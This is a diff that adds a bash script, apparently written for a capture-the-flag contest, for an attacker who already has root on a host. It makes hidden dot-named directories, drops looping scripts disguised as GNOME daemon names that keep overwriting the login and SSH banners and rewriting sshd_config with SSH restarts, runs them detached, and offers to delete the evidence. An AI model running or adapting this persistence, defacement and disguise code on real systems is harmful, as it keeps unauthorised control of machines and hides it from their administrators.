@@ -1,0 +1,77 @@
+#!/bin/bash
+# Purpose: To reclaim flags
+# Written by: Foxtrot
+#
+# GET GUDDDD
+#########################
+
+
+echo "Are you running this as root? (y/n)"
+read response
+
+if [ $response == "n" ] || [ $response == "n" ]; then
+	echo "Escalate to root for his to fully work please!"
+	exit
+fi
+
+
+echo "Welcome, good work with getting in, now let me do the rest"
+
+
+# assuming privileges allowed let 7 be the lucky number
+##### PREPWORK #####
+
+issueBanner="/etc/issue.net"
+sshBanner="/etc/banner"
+motdBanner="/etc/motd"
+
+`mkdir ../.../`
+`mkdir ../................./`
+`mkdir ../......./`
+`mkdir ../......./.../`
+`mkdir ../......./.../.../`
+`mkdir ../......../`
+`mkdir ../......................../`
+
+los="../......./gsd-media-sound"
+los2="../......./.../gsd-media-keyboard"
+los3="../......./.../.../gsd-media-controls"
+los4="../......./.../.../gsd-mouse"
+
+`cp ourBanner.txt ../......./`
+`cp ourBanner.txt ../......./.../`
+`cp ourBanner.txt ../......./.../.../`
+
+sedCommand="sed -i 's/Banner.*/Banner \/etc\/banner/g' /etc/ssh/sshd_config"
+restartCommand="/etc/init.d/ssh restart"
+
+echo "#!/bin/bash" > $los
+echo "#!/bin/bash" > $los2
+echo "#!/bin/bash" > $los3
+echo "#!/bin/bash" > $los4
+
+echo "while true; do cat ourBanner.txt > $issueBanner; sleep 50; done" >> $los
+echo "while true; do cat ourBanner.txt > $sshBanner; sleep 50; done" >> $los2
+echo "while true; do cat ourBanner.txt > $motdBanner; sleep 50; done" >> $los3
+echo "while true; do $sedCommand && $restartCommand; sleep 100; done" >> $los4
+`chmod u+x $los`
+`chmod u+x $los2`
+`chmod u+x $los3`
+`chmod u+x $los4`
+
+##### Running #####
+`$los` &
+`$los2` &
+`$los3` &
+`$los4` &
+`disown`
+
+echo "Would you like me to delete the evidence?"
+
+read inputcommand
+
+if [ $inputcommand == "yes" ] || [ $inputcommand == "y" ]; then
+	`rm werun`
+	echo "Nothing to see here >_>"
+fi
+
